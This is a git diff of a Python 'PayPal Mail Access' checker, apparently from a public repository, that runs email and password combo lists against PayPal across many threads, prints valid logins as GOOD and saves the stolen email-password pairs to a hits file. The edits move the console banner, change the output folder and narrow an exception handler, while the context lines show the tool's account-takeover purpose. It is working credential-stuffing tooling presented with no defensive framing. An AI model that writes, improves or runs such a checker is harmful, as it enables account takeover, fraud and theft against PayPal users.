@@ -12,15 +12,6 @@ class Paypal:
         self.client = requests.Session()
         self.hits, self.bad, self.twofa, self.retries = 0, 0, 0, 0
 
-    def banner(self):
-        os.system(f'cls && title PayPal Mail Access ^| github.com/Plasmonix')
-        print(f'''
-                                                        \x1b[38;5;63m ╔═╗╔═╗╦ ╦╔═╗╔═╗╦   
-                                                        \x1b[38;5;63m ╠═╝╠═╣╚╦╝╠═╝╠═╣║  
-                                                        \x1b[38;5;63m ╩  ╩ ╩ ╩ ╩  ╩ ╩╩═╝
-                                                            \u001b[0mMail \x1b[\x1b[38;5;63mAccess\u001b[0m
-                                                        ''')
-
     def update_title(self):
         while True:
             self.timenow = time.strftime("%H:%M:%S", time.localtime())
@@ -71,7 +62,7 @@ class Paypal:
                 elif '"firstPartyUserAccessToken"' in res.text or '"phones"' in res.text:
                     lock.acquire()
                     print(f'\u001b[0m[\x1b[\x1b[38;5;63m{self.timenow}\u001b[0m] [\x1b32mGOOD\x1b[0m] | {email} | {password}')
-                    with open('./data/hits.txt', 'a+', encoding='utf-8') as fp:
+                    with open('./results/hits.txt', 'a+', encoding='utf-8') as fp:
                         fp.writelines(f'Email: {email} Password: {password}\n')
                     self.hits += 1
                     lock.release()
@@ -82,8 +73,9 @@ class Paypal:
                     self.twofa += 1
                     lock.release()
 
-            except:
+            except requests.ConnectionError as e:
                 lock.acquire()
+                # print(f'[\x1b[31m!\x1b[0m] {e.args}.')
                 print(f'[\x1b[31m!\x1b[0m] Could not establish connection.')
                 self.retries += 1
                 lock.release()
@@ -92,10 +84,14 @@ class Paypal:
         return [slice[i::self.thread_count] for i in range(self.thread_count)]
 
     def main(self):
-        self.banner()
+        os.system(f'cls & mode 140,24 && title PayPal Mail Access ^| github.com/Plasmonix' if os.name == "nt" else "clear")
+        print(f'''
+        \t\t\t\t\t\t\x1b[38;5;63m ╔═╗╔═╗╦ ╦╔═╗╔═╗╦   
+        \t\t\t\t\t\t\x1b[38;5;63m ╠═╝╠═╣╚╦╝╠═╝╠═╣║  
+        \t\t\t\t\t\t\x1b[38;5;63m ╩  ╩ ╩ ╩ ╩  ╩ ╩╩═╝
+        \t\t\t\t\t\t\u001b[0m    Mail \x1b[\x1b[38;5;63mAccess\u001b[0m''')
         self.load_combos()
         self.thread_count = int(input(f'\u001b[0m[\x1b[\x1b[38;5;63m?\u001b[0m] Threads> '))
-        self.banner()
         threading.Thread(target=self.update_title).start()
         threads = []
         for i in range(self.thread_count):
